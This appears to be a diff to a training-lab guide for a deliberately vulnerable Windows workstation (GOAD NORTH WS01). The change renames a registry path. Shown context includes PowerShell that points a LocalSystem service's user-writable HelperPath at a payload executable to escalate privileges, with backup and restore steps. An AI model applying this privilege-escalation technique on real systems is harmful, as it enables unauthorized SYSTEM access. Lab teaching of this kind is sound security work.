@@ -4,7 +4,7 @@ This guide is for the NORTH WS01 training instance only. The code is a separate 
 
 ## What is different from Topic 10?
 
-Topic 10 changed Windows' service ImagePath and used a reboot to trigger an automatically started service. Topic 11 leaves the service ImagePath untouched and changes the application-specific HelperPath under HKLM\SOFTWARE\GOAD Kingdoms\KingdomConfigSvc.
+Topic 10 changed Windows' service ImagePath and used a reboot to trigger an automatically started service. Topic 11 leaves the service ImagePath untouched and changes the application-specific HelperPath under HKLM\SOFTWARE\Kingdoms\KingdomConfigSvc.
 
 The service runs as LocalSystem, starts manually and grants BUILTIN\Users start and stop rights. It reads the 64-bit HelperPath value in OnStart, then launches the chosen executable as a child process. Rickon can both edit HelperPath and request a start without restarting WS01.
 
@@ -21,6 +21,8 @@ test -f "$GOAD_PROVIDER_DIR/.vagrant/machines/GOAD-WS01/vmware_desktop/id"
 bash scripts/apply-windows-lpe-candidates.sh insecure_service_registry
 ```
 
+During apply, only the `KingdomConfigSvc` child key is removed from the former `HKLM\\SOFTWARE\\GOAD Kingdoms` namespace and the new `HKLM\\SOFTWARE\\Kingdoms` namespace before recreating the scenario. The parent keys and all other values remain untouched. This is a deliberate migration from the earlier installed path.
+
 The technique-specific apply does not reset other existing NORTH LPE scenarios. The source files in the shared repository do not deploy anything to KINGDOMS or WSLPE unless their own inventories and workflows are explicitly used.
 
 ## Verify provisioning as Rickon
@@ -30,7 +32,7 @@ whoami
 sc.exe qc KingdomConfigSvc
 sc.exe query KingdomConfigSvc
 sc.exe sdshow KingdomConfigSvc
-reg.exe query "HKLM\SOFTWARE\GOAD Kingdoms\KingdomConfigSvc" /v HelperPath /reg:64
+reg.exe query "HKLM\SOFTWARE\Kingdoms\KingdomConfigSvc" /v HelperPath /reg:64
 Test-Path -LiteralPath 'C:\Users\Public\Documents\KingdomConfigShell.exe' -PathType Leaf
 quser
 ```
@@ -40,7 +42,7 @@ Expected values include LocalSystem, DEMAND_START, the original protected Kingdo
 ## Preserve the original setting
 
 ```powershell
-$subkey = 'SOFTWARE\GOAD Kingdoms\KingdomConfigSvc'
+$subkey = 'SOFTWARE\Kingdoms\KingdomConfigSvc'
 $base = [Microsoft.Win32.RegistryKey]::OpenBaseKey([Microsoft.Win32.RegistryHive]::LocalMachine,[Microsoft.Win32.RegistryView]::Registry64)
 $key = $base.OpenSubKey($subkey)
 if ($null -eq $key) { throw 'Missing application Registry key' }
@@ -51,7 +53,7 @@ try {
 finally { $key.Close(); $base.Close() }
 $originalHelper
 $originalKind
-reg.exe export "HKLM\SOFTWARE\GOAD Kingdoms\KingdomConfigSvc" "$env:TEMP\KingdomConfigSvc-before.reg" /y /reg:64
+reg.exe export "HKLM\SOFTWARE\Kingdoms\KingdomConfigSvc" "$env:TEMP\KingdomConfigSvc-before.reg" /y /reg:64
 ```
 
 Stop if the original setting is absent or unreadable. Preserve the Registry type and do not overwrite the backup.
@@ -68,7 +70,7 @@ $key = $base.OpenSubKey($subkey,[Microsoft.Win32.RegistryKeyPermissionCheck]::Re
 if ($null -eq $key) { $base.Close(); throw 'SetValue denied' }
 try { $key.SetValue('HelperPath',$payload,$originalKind) }
 finally { $key.Close(); $base.Close() }
-reg.exe query "HKLM\SOFTWARE\GOAD Kingdoms\KingdomConfigSvc" /v HelperPath /reg:64
+reg.exe query "HKLM\SOFTWARE\Kingdoms\KingdomConfigSvc" /v HelperPath /reg:64
 ```
 
 Expected output has the new path with REG_SZ. This proves only the Registry edit, not SYSTEM execution.
@@ -94,7 +96,7 @@ $key = $base.OpenSubKey($subkey,[Microsoft.Win32.RegistryKeyPermissionCheck]::Re
 if ($null -eq $key) { $base.Close(); throw 'Cannot restore original HelperPath' }
 try { $key.SetValue('HelperPath',$originalHelper,$originalKind) }
 finally { $key.Close(); $base.Close() }
-reg.exe query "HKLM\SOFTWARE\GOAD Kingdoms\KingdomConfigSvc" /v HelperPath /reg:64
+reg.exe query "HKLM\SOFTWARE\Kingdoms\KingdomConfigSvc" /v HelperPath /reg:64
 sc.exe qc KingdomConfigSvc
 ```
 
